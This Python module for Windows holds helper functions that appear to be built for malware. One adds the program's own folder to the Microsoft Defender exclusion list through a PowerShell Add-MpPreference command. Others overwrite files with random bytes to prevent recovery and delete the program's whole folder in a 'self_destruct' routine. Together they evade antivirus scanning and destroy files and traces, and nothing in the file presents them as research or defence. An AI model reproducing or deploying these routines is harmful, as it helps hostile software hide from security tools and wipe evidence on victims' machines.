import ctypes.wintypes
import subprocess
import os
import ctypes
import shutil

def is_admin():
    """ check for privilege """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def add_exclusion():
    """ 
    add current directory to exclusion list 
    return true if success
    """
    exclusion_path = os.path.dirname(os.path.abspath(__file__))
    ps_cmd = f"powershell.exe Add-MpPreference -ExclusionPath '{exclusion_path}'"

    try:
        result = subprocess.run(ps_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return True
        else:
            return False
    except Exception as e:
        pass

def wipe_file(file_path, passes=1):
    """ Write random bytes multiple times to avoid recovery """
    try:
        with open(file_path, "r+b") as file:
            length = os.path.getsize(file_path)
            for i in range(passes):
                file.seek(0)
                file.write(os.urandom(length))
    except:
        return False
    
def delete_folder(folder_path):
    """ Removes whole folder containing program """
    try:
        for root, dirs, files in os.walk(folder_path, topdown=False):
            for name in files:
                file_path = os.path.join(root, name)
                wipe_file(file_path, passes=1)
        shutil.rmtree(folder_path)
    except:
        return False

def self_destruct():
    """ destroy self """
    try:
        # current_pwd = os.path.realpath(__file__)
        current_pwd = os.path.dirname(os.path.realpath(__file__))
        # os.remove(current_pwd)
        delete_folder(current_pwd)
    except:
        return False

def display_message(message, title="Notification", box_type="info"):
    """ display info box """
    if box_type == "info":
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)